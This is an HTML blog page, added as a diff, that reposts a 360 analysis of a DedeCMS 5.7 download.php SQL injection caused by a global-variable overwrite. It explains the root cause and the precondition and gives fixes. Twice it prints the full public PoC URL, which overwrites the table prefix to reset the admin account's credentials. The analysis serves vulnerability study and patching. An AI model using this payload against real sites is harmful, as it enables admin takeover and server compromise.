@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Dedecms最新注入漏洞分析 download.php | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-06-17T23:52:14.000Z" itemprop="datePublished">
+          2013-06-18
+      </time>
+    
+    
+    | 
+    <a href='/tag/getshell/'>getshell</a>
+    
+    
+</span>
+    <h1 class="post-title">Dedecms最新注入漏洞分析 download.php</h1>
+    <section class="post-content">
+      <p>【转的360的分析】</p>  <p>最近看到网上曝出的dedecms最新版本的一个注入漏洞利用，漏洞PoC和分析文章也已在网上公开.但是在我实际测试过程当中，发现无法复现。原因是此漏洞的利用需要一定的前提条件，而原分析文章当中并没有交代这些，所以这里将我的分析过程以及一些触发的必要条件总结了一下。</p>  <p>一. 漏洞跟踪</p>  <p>发布时间：2013年6月7日</p>  <p>漏洞描述：</p>  <p>DedeCMS是一个网站应用系统构建平台，也是一个强大的网站内容管理系统。基于PHP+MySQL的技术架构，完全开源加上强大稳定的技术架构，既可以用来构建复杂体系的企业信息门户或电子商务网站平台，也可以用来管理简单内容发布网站，不管是商务资源门户还是娱乐信息门户，它都是您管理网站的好帮手。</p>  <p>漏洞触发的根源在于dedesql.class.php在调用$GLOBALS[‘arrs1’]、$GLOBALS[‘arrs2’]这两个全局变量之前未对其进行初始化，导致能够覆盖任意全局变量。</p>  <p>漏洞危害：因为dedecms的使用非常广泛，而此漏洞利用方便，危害性高，能够远程获取管理后台，进而直接<a href="http://Ha.Cker.In/tag/getshell" target="_blank">getshell</a>获取系统控制权。</p>  <p>触发条件：确保php.ini中使用php_mysql.dll同时未开启php_mysqli.dll，</p>  <p>如图所示：</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image00211.jpg" target="_blank" rel="external"><img title="clip_image001[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="237" alt="clip_image001[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0011.jpg" width="647" border="0"></a></p>  <p>受影响版本：dedecms 5.7</p>  <p>二. 漏洞原理</p>  <p>首先说一下dedecms不安全的参数处理机制，这里我们看一下/include/common.inc.php代码的第79行：</p>  <p>foreach(Array(‘_GET’,’_POST’,’_COOKIE’) as $_request)</p>  <p>&#160;&#160;&#160;&#160;&#160; {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; foreach($$_request as $_k =&gt; $_v)</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; if($_k == ‘nvarname’) ${$_k} = $_v;</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; else ${$_k} = _RunMagicQuotes($_v);</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</p>  <p>&#160;&#160;&#160;&#160;&#160; }</p>  <p>万恶之源其实就在这里，基本上目前dede被发现的漏洞全都死在这里。我们可以看到，程序从GPC数组中取出名值对后，只是对$_v做了简单的addslashes处理，就直接赋给了${$_k}，实现了类似全局变量覆盖的机制，设计的初衷是为了开发方便，但却存在着严重的安全问题。PHP在经历了这么多年的更新换代终于修补了register_globals问题，但是dede的这段代码使php付出的努力全部白费。</p>  <p>下面我们回归漏洞。</p>  <p>首先是/include/dedesql.class.php的第589-600行，</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image00411.jpg" target="_blank" rel="external"><img title="clip_image002[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="448" alt="clip_image002[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0021.jpg" width="616" border="0"></a></p>  <p>在执行这段代码之前，程序未初始化$arrs1和$arrs2这两个数组。结合前面提到的dede不安全的参数处理机制，利用这段代码我们可以控制$GLOBALS[$v1]的值。例如在这个漏洞中，$GLOBALS[$v1]是拼接而成，我们可以控制$GLOBALS[‘cfg_dbprefix’]的值。</p>  <p>然后，我们来看一下如何利用$GLOBALS[‘cfg_dbprefix’]。</p>  <p>这里在/include/dedesql.class.php的第512行SetQuery函数中，代码如下</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image00611.jpg" target="_blank" rel="external"><img title="clip_image003[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="193" alt="clip_image003[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0031.jpg" width="639" border="0"></a></p>  <p>这里因为$GLOBALS[‘cfg_dbprefix’]是可控的，进而$prefix也是可控的，所以在这儿就造成了SQL注入。</p><br><a id="more"></a><br><p></p>  <p>下面跟踪一下整个漏洞的触发过程，这是网上已经公开的PoC：</p>  <p><a href="http://localhost/dedecms5.7/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=115&amp;arrs2[]=116&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=32&amp;arrs2[]=35" target="_blank" rel="external">http://localhost/dedecms5.7/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=115&amp;arrs2[]=116&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=32&amp;arrs2[]=35</a></p>  <p>首先看这个if判断，意思是如果开启了mysqli扩展，则包含dedesqli.class.php。这里存在漏洞的代码在dedesql.class.php中，所以漏洞利用的前提条件是必须关闭mysqli扩展。</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image00811.jpg" target="_blank" rel="external"><img title="clip_image004[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="339" alt="clip_image004[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0041.jpg" width="644" border="0"></a></p>  <p>这里跟入dedesql.class.php代码，如图</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image01011.jpg" target="_blank" rel="external"><img title="clip_image005[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="437" alt="clip_image005[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0051.jpg" width="639" border="0"></a></p>  <p>这里我们传入的arrs1、arrs2两个数组因为还没有被初始化，所以这里$v1、$v2拼接为字符串，如图所示</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image01211.jpg" target="_blank" rel="external"><img title="clip_image006[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="214" alt="clip_image006[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0061.jpg" width="648" border="0"></a></p>  <p>所以执行到这里$GLOBALS[‘cfg_dbprefix’]被覆盖为</p>  <p>admin<code>SET</code>userid<code>=’test’,</code>pwd`=’f297a57a5a743894a0e4′ where id=1 #</p>  <p>继续跟踪代码执行，</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image01411.jpg" target="_blank" rel="external"><img title="clip_image007[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="329" alt="clip_image007[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0071.jpg" width="634" border="0"></a></p>  <p>跟入ExecuteNoneQuery2函数，一直跟进SetQuery，如图</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image01611.jpg" target="_blank" rel="external"><img title="clip_image008[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="222" alt="clip_image008[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0081.jpg" width="640" border="0"></a></p>  <p>这里因为$GLOBALS[‘cfg_dbprefix’]是我们可控的，所以就造成了注入，这里看一下$sql的值，如图所示</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image01811.jpg" target="_blank" rel="external"><img title="clip_image009[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="220" alt="clip_image009[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0091.jpg" width="651" border="0"></a></p>  <p>因为ExecuteNoneQuery2函数没有使用mysql-ids进行过滤，所以这里借助它来注入。执行update成功之后，后台账户为test，密码为admin。</p>  <p>三. 漏洞验证</p>  <p>PoC：</p>  <p><a href="http://localhost/dedecms5.7/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=115&amp;arrs2[]=116&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=32&amp;arrs2[]=35" target="_blank" rel="external">http://localhost/dedecms5.7/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=115&amp;arrs2[]=116&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=32&amp;arrs2[]=35</a></p>  <p>验证截图：</p>  <p><a href="http://blogs.360.cn/360safe/files/2013/06/clip_image0201.jpg" target="_blank" rel="external"><img title="clip_image010[1]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="435" alt="clip_image010[1]" src="http://img.cker.in/Dedecmsdownload.php_DEE5/clip_image0101.jpg" width="640" border="0"></a></p>  <p>四. 漏洞修复</p>  <p>0×01、修改php.ini，确保开启php_mysqli.dll扩展。</p>  <p>0×02、修改/include/dedesql.class.php中的代码，如下所示</p>  <p>$arrs1 = array(0x63,0x66,0x67,0x5f,0x70,0x6f,0x77,0x65,0x72,0x62,0x79); </p>  <p>$arrs2 = array(0x20,0x3c,0x61,0x20,0x68,0x72,0x65,0x66,0x3d,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f, </p>  <p>0x77,0x77,0x77,0x2e,0x64,0x65,0x64,0x65,0x63,0x6d,0x73,0x2e,0x63,0x6f,0x6d,0x20,0x74,0x61,0x72, </p>  <p>0x67,0x65,0x74,0x3d,0x27,0x5f,0x62,0x6c,0x61,0x6e,0x6b,0x27,0x3e,0x50,0x6f,0x77,0x65,0x72,0x20, </p>  <p>0x62,0x79,0x20,0x44,0x65,0x64,0x65,0x43,0x6d,0x73,0x3c,0x2f,0x61,0x3e); </p>  <p>if(isset($GLOBALS[‘arrs1’]))</p>  <p>{</p>  <p>&#160;&#160;&#160;&#160;&#160; $v1 = $v2 = ”;</p>  <p>&#160;&#160;&#160;&#160;&#160; for($i=0;isset($arrs1[$i]);$i++)</p>  <p>&#160;&#160;&#160;&#160;&#160; {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $v1 .= chr($arrs1[$i]);</p>  <p>&#160;&#160;&#160;&#160;&#160; }</p>  <p>&#160;&#160;&#160;&#160;&#160; for($i=0;isset($arrs2[$i]);$i++)</p>  <p>&#160;&#160;&#160;&#160;&#160; {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $v2 .= chr($arrs2[$i]);</p>  <p>&#160;&#160;&#160;&#160;&#160; }</p>  <p>&#160;&#160;&#160;&#160;&#160; $GLOBALS[$v1] .= $v2;</p>  <p>}</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1006.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1006.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1006.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1006.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1007.seo/">
+        ← webkit浏览器css设置滚动条
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1005.seo/">
+        浅谈安全宝等云端WAF的绕过思路 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
